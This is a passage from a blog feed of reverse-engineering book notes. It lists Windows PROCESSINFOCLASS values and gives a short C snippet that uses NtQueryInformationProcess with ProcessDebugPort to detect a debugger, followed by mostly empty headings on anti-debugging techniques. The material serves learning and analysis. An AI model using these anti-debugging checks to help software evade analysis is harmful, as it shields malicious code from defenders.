PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION // 40<br>    ProcessThreadStackAllocation,                   // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX<br>    ProcessWorkingSetWatchEx,                       // q: PROCESS_WS_WATCH_INFORMATION_EX[]; s: void<br>    ProcessImageFileNameWin32,                      // q: UNICODE_STRING<br>    ProcessImageFileMapping,                        // q: HANDLE (input)<br>    ProcessAffinityUpdateMode,                      // qs: PROCESS_AFFINITY_UPDATE_MODE<br>    ProcessMemoryAllocationMode,                    // qs: PROCESS_MEMORY_ALLOCATION_MODE<br>    ProcessGroupInformation,                        // q: USHORT[]<br>    ProcessTokenVirtualizationEnabled,              // s: ULONG<br>    ProcessConsoleHostProcess,                      // qs: ULONG_PTR // ProcessOwnerInformation<br>    ProcessWindowInformation,                       // q: PROCESS_WINDOW_INFORMATION // 50<br>    ProcessHandleInformation,                       // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8<br>    ProcessMitigationPolicy,                        // s: PROCESS_MITIGATION_POLICY_INFORMATION<br>    ProcessDynamicFunctionTableInformation,         // s: PROCESS_DYNAMIC_FUNCTION_TABLE_INFORMATION<br>    ProcessHandleCheckingMode,                      // qs: ULONG; s: 0 disables, otherwise enables<br>    ProcessKeepAliveCount,                          // q: PROCESS_KEEPALIVE_COUNT_INFORMATION<br>    ProcessRevokeFileHandles,                       // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION<br>    ProcessWorkingSetControl,                       // s: PROCESS_WORKING_SET_CONTROL<br>    ProcessHandleTable,                             // q: ULONG[] // since WINBLUE<br>    ProcessCheckStackExtentsMode,                   // qs: ULONG // KPROCESS-&gt;CheckStackExtents (CFG)<br>    ProcessCommandLineInformation,                  // q: UNICODE_STRING // 60<br>    ProcessProtectionInformation,                   // q: PS_PROTECTION<br>    ProcessMemoryExhaustion,                        // s: PROCESS_MEMORY_EXHAUSTION_INFO // since THRESHOLD<br>    ProcessFaultInformation,                        // s: PROCESS_FAULT_INFORMATION<br>    ProcessTelemetryIdInformation,                  // q: PROCESS_TELEMETRY_ID_INFORMATION<br>    ProcessCommitReleaseInformation,                // qs: PROCESS_COMMIT_RELEASE_INFORMATION<br>    ProcessDefaultCpuSetsInformation,               // qs: SYSTEM_CPU_SET_INFORMATION[5] // ProcessReserved1Information<br>    ProcessAllowedCpuSetsInformation,               // qs: SYSTEM_CPU_SET_INFORMATION[5] // ProcessReserved2Information<br>    ProcessSubsystemProcess,                        // s: void // EPROCESS-&gt;SubsystemProcess<br>    ProcessJobMemoryInformation,                    // q: PROCESS_JOB_MEMORY_INFO<br>    ProcessInPrivate,                               // q: BOOLEAN; s: void // ETW // since THRESHOLD2 // 70<br>    ProcessRaiseUMExceptionOnInvalidHandleClose,    // qs: ULONG; s: 0 disables, otherwise enables<br>    ProcessIumChallengeResponse,                    // q: PROCESS_IUM_CHALLENGE_RESPONSE<br>    ProcessChildProcessInformation,                 // q: PROCESS_CHILD_PROCESS_INFORMATION<br>    ProcessHighGraphicsPriorityInformation,         // q: BOOLEAN; s: BOOLEAN (requires SeTcbPrivilege)<br>    ProcessSubsystemInformation,                    // q: SUBSYSTEM_INFORMATION_TYPE // since REDSTONE2<br>    ProcessEnergyValues,                            // q: PROCESS_ENERGY_VALUES, PROCESS_EXTENDED_ENERGY_VALUES, PROCESS_EXTENDED_ENERGY_VALUES_V1<br>    ProcessPowerThrottlingState,                    // qs: POWER_THROTTLING_PROCESS_STATE<br>    ProcessActivityThrottlePolicy,                  // qs: PROCESS_ACTIVITY_THROTTLE_POLICY // ProcessReserved3Information<br>    ProcessWin32kSyscallFilterInformation,          // q: WIN32K_SYSCALL_FILTER<br>    ProcessDisableSystemAllowedCpuSets,             // s: BOOLEAN // 80<br>    ProcessWakeInformation,                         // q: PROCESS_WAKE_INFORMATION // (kernel-mode only)<br>    ProcessEnergyTrackingState,                     // qs: PROCESS_ENERGY_TRACKING_STATE<br>    ProcessManageWritesToExecutableMemory,          // s: MANAGE_WRITES_TO_EXECUTABLE_MEMORY // since REDSTONE3<br>    ProcessCaptureTrustletLiveDump,                 // q: ULONG<br>    ProcessTelemetryCoverage,                       // q: TELEMETRY_COVERAGE_HEADER; s: TELEMETRY_COVERAGE_POINT<br>    ProcessEnclaveInformation,<br>    ProcessEnableReadWriteVmLogging,                // qs: PROCESS_READWRITEVM_LOGGING_INFORMATION<br>    ProcessUptimeInformation,                       // q: PROCESS_UPTIME_INFORMATION<br>    ProcessImageSection,                            // q: HANDLE<br>    ProcessDebugAuthInformation,                    // s: CiTool.exe --device-id // PplDebugAuthorization // since RS4 // 90<br>    ProcessSystemResourceManagement,                // s: PROCESS_SYSTEM_RESOURCE_MANAGEMENT<br>    ProcessSequenceNumber,                          // q: ULONGLONG<br>    ProcessLoaderDetour,                            // qs: Obsolete // since RS5<br>    ProcessSecurityDomainInformation,               // q: PROCESS_SECURITY_DOMAIN_INFORMATION<br>    ProcessCombineSecurityDomainsInformation,       // s: PROCESS_COMBINE_SECURITY_DOMAINS_INFORMATION<br>    ProcessEnableLogging,                           // qs: PROCESS_LOGGING_INFORMATION<br>    ProcessLeapSecondInformation,                   // qs: PROCESS_LEAP_SECOND_INFORMATION<br>    ProcessFiberShadowStackAllocation,              // s: PROCESS_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION // since 19H1<br>    ProcessFreeFiberShadowStackAllocation,          // s: PROCESS_FREE_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION<br>    ProcessAltSystemCallInformation,                // s: PROCESS_SYSCALL_PROVIDER_INFORMATION // since 20H1 // 100<br>    ProcessDynamicEHContinuationTargets,            // s: PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION<br>    ProcessDynamicEnforcedCetCompatibleRanges,      // s: PROCESS_DYNAMIC_ENFORCED_ADDRESS_RANGE_INFORMATION // since 20H2<br>    ProcessCreateStateChange,                       // s: Obsolete // since WIN11<br>    ProcessApplyStateChange,                        // s: Obsolete<br>    ProcessEnableOptionalXStateFeatures,            // s: ULONG64 // EnableProcessOptionalXStateFeatures<br>    ProcessAltPrefetchParam,                        // qs: OVERRIDE_PREFETCH_PARAMETER // App Launch Prefetch (ALPF) // since 22H1<br>    ProcessAssignCpuPartitions,                     // s: HANDLE<br>    ProcessPriorityClassEx,                         // s: PROCESS_PRIORITY_CLASS_EX<br>    ProcessMembershipInformation,                   // q: PROCESS_MEMBERSHIP_INFORMATION<br>    ProcessEffectiveIoPriority,                     // q: IO_PRIORITY_HINT // 110<br>    ProcessEffectivePagePriority,                   // q: ULONG<br>    ProcessSchedulerSharedData,                     // q: SCHEDULER_SHARED_DATA_SLOT_INFORMATION // since 24H2<br>    ProcessSlistRollbackInformation,<br>    ProcessNetworkIoCounters,                       // q: PROCESS_NETWORK_COUNTERS<br>    ProcessFindFirstThreadByTebValue,               // q: PROCESS_TEB_VALUE_INFORMATION // NtCurrentProcess<br>    ProcessEnclaveAddressSpaceRestriction,          // qs: // since 25H2<br>    ProcessAvailableCpus,                           // q: PROCESS_AVAILABLE_CPUS_INFORMATION<br>    MaxProcessInfoClass<br>&#125; PROCESSINFOCLASS;<br><br>//Source: https://ntdoc.m417z.com/processinfoclass<br></code></pre></td></tr></table></figure><h3 id="ProcessDebugPort-0x7"><a href="#ProcessDebugPort-0x7" class="headerlink" title="ProcessDebugPort(0x7)"></a>ProcessDebugPort(0x7)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">DWORD dwDebugPort = 0;<br>pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &amp;dwDebugPort, sizeof(dwDebugPort), NULL);<br>printf(&quot;NtQueryInformationProcess(PorcessDebugPort) = 0x%X\n&quot;, dwDebugPort);<br>if (dwDebugPort != 0x0)<br>    printf(&quot;\t=&gt; Debugging.\n&quot;);<br>else<br>    printf(&quot;\t=&gt; Not debugging.\n&quot;);<br></code></pre></td></tr></table></figure><p><strong>CheckRemoteDebuggerPresent()</strong></p><h3 id="ProcessDebugObjectHandle-0x1E"><a href="#ProcessDebugObjectHandle-0x1E" class="headerlink" title="ProcessDebugObjectHandle(0x1E)"></a>ProcessDebugObjectHandle(0x1E)</h3><h3 id="ProcessDebugFlags-0x1F"><a href="#ProcessDebugFlags-0x1F" class="headerlink" title="ProcessDebugFlags(0x1F)"></a>ProcessDebugFlags(0x1F)</h3><h2 id="51-4-NtQuerySystemInformation"><a href="#51-4-NtQuerySystemInformation" class="headerlink" title="51.4 - NtQuerySystemInformation()"></a>51.4 - NtQuerySystemInformation()</h2><h2 id="51-5-NtQueryObject"><a href="#51-5-NtQueryObject" class="headerlink" title="51.5 - NtQueryObject()"></a>51.5 - NtQueryObject()</h2><h2 id="51-6-ZwSetInformationThread"><a href="#51-6-ZwSetInformationThread" class="headerlink" title="51.6 - ZwSetInformationThread()"></a>51.6 - ZwSetInformationThread()</h2><h2 id="51-7-TLS-Callback-Function"><a href="#51-7-TLS-Callback-Function" class="headerlink" title="51.7 - TLS Callback Function"></a>51.7 - TLS Callback Function</h2><h2 id="51-8-ETC"><a href="#51-8-ETC" class="headerlink" title="51.8 - ETC"></a>51.8 - ETC</h2><h1 id="Chapter-52-Dynamic-Anti-Debugging-Techniques"><a href="#Chapter-52-Dynamic-Anti-Debugging-Techniques" class="headerlink" title="Chapter 52 - Dynamic Anti-Debugging Techniques"></a>Chapter 52 - Dynamic Anti-Debugging Techniques</h1><h2 id="52-2-Exception"><a href="#52-2-Exception" class="headerlink" title="52.2 - Exception"></a>52.2 - Exception</h2><h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><h3 id="SetUnhandledExceptionFilter"><a href="#SetUnhandledExceptionFilter" class="headerlink" title="SetUnhandledExceptionFilter()"></a>SetUnhandledExceptionFilter()</h3><h2 id="52-3-Time-Checking"><a href="#52-3-Time-Checking" class="headerlink" title="52.3 - Time Checking"></a>52.3 - Time Checking</h2><h3 id="Interval"><a href="#Interval" class="headerlink" title="Interval"></a>Interval</h3><ol><li>COunter based method</li><li>Time based method</li></ol><h3 id="RDTSC"><a href="#RDTSC" class="headerlink" title="RDTSC"></a>RDTSC</h3><h2 id="52-4-Trap-Flag"><a href="#52-4-Trap-Flag" class="headerlink" title="52.4 - Trap Flag"></a>52.4 - Trap Flag</h2><h2 id="52-5-0xCC"><a href="#52-5-0xCC" class="headerlink" title="52.5 - 0xCC"></a>52.5 - 0xCC</h2><h1 id="Chapter-53-Advanced-Anti-Debugging"><a href="#Chapter-53-Advanced-Anti-Debugging" class="headerlink" title="Chapter 53 - Advanced Anti-Debugging"></a>Chapter 53 - Advanced Anti-Debugging</h1><h2 id="53-1-Advanced-Anti-Debugging"><a href="#53-1-Advanced-Anti-Debugging" class="headerlink" title="53.1 - Advanced Anti-Debugging"></a>53.1 - Advanced Anti-Debugging</h2><h2 id="53-2-Garbage-Code"><a href="#53-2-Garbage-Code" class="headerlink" title="53.2 - Garbage Code"></a>53.2 - Garbage Code</h2><h2 id="53-3-Breaking-Code-Alignment"><a href="#53-3-Breaking-Code-Alignment" class="headerlink" title="53.3 - Breaking Code Alignment"></a>53.3 - Breaking Code Alignment</h2><h2 id="53-4-Encryption-Decription"><a href="#53-4-Encryption-Decription" class="headerlink" title="53.4 - Encryption/Decription"></a>53.4 - Encryption/Decription</h2><h2 id="53-5-Stolen-Bytes-Remove-OEP"><a href="#53-5-Stolen-Bytes-Remove-OEP" class="headerlink" title="53.5 - Stolen Bytes (Remove OEP)"></a>53.5 - Stolen Bytes (Remove OEP)</h2><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/53.5.png'><img src="/images/books/ReverseEngineeringCore/53.5.png" width="700" alt="Stolen Bytes"></p><h2 id="53-6-API-Relocation"><a href="#53-6-API-Relocation" class="headerlink" title="53.6 - API Relocation"></a>53.6 - API Relocation</h2><h2 id="53-7-Debug-Blocker-Self-Debugging"><a href="#53-7-Debug-Blocker-Self-Debugging" class="headerlink" title="53.7 - Debug Blocker (Self Debugging)"></a>53.7 - Debug Blocker (Self Debugging)</h2><h1 id="Chapter-54-Practice-1-Service"><a href="#Chapter-54-Practice-1-Service" class="headerlink" title="Chapter 54 - Practice#1: Service"></a>Chapter 54 - Practice#1: Service</h1><h1 id="Chapter-55-Practice-2-Self-Creation"><a href="#Chapter-55-Practice-2-Self-Creation" class="headerlink" title="Chapter 55 - Practice#2: Self Creation"></a>Chapter 55 - Practice#2: Self Creation</h1><h1 id="Chapter-56-Practice-3-PE-Image-Switching"><a href="#Chapter-56-Practice-3-PE-Image-Switching" class="headerlink" title="Chapter 56 - Practice#3: PE Image Switching"></a>Chapter 56 - Practice#3: PE Image Switching</h1><h1 id="Chapter-57-Practice-4-Debug-Blocker"><a href="#Chapter-57-Practice-4-Debug-Blocker" class="headerlink" title="Chapter 57 - Practice#4: Debug Blocker"></a>Chapter 57 - Practice#4: Debug Blocker</h1><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="http://example.com/categories/Book/"/>
    
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Study" scheme="http://example.com/tags/Study/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
    <category term="Reverse Engineering" scheme="http://example.com/tags/Reverse-Engineering/"/>
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="Assembly" scheme="http://example.com/tags/Assembly/"/>
    
    <category term="PE" scheme="http://example.com/tags/PE/"/>
    
    <category term="CrackMe" scheme="http://example.com/tags/CrackMe/"/>
    
  </entry>
  
</feed>
